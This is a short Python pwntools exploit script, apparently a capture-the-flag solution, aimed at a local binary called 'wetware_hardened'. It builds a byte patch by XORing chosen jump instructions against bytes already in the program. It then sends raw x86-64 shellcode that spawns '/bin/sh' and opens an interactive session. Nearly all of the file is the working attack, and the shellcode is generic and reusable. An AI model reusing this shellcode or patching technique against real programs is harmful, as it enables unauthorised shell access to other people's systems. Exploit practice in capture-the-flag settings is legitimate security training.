#!/usr/bin/env python2
from pwn import *
from IPython import embed

p = process("./wetware_hardened")

def main():


    #lea esi, [rdi-0x80]:
    in1 = '\x8d\x77\x80'
    #jz -0x6a:
    in2 = '\x74\x94'
    #jz -0x67:
    #in2 = '\x74\x98'

    #jmp [rsi-0x5c]:
    #in2 = '\xff\x66\xa4'
    jump = in1+in2
    #bytes currently in the binary:
    xist = "\xd5\x6e\x68\x6e\x6e"
    patch = bytearray([ord(i[0]) ^ ord(i[1]) for i in zip(jump, xist)])

    payload = ""
    #payload += "mnemonic"
    payload += str(patch)
    payload += "y"

    payload2 = ""
    payload2 += "\x48\x31\xc0\x48\x83\xec\x70\x50\x48\x89\xe2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x52\x48\x89\xe2\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

    print(p.read())

    print("pausing for input...")
    raw_input()
    #p.sendline("johnny")

    p.sendline(payload)
    p.sendline(payload2)

    embed(banner1="")

if __name__ == "__main__":
    main()
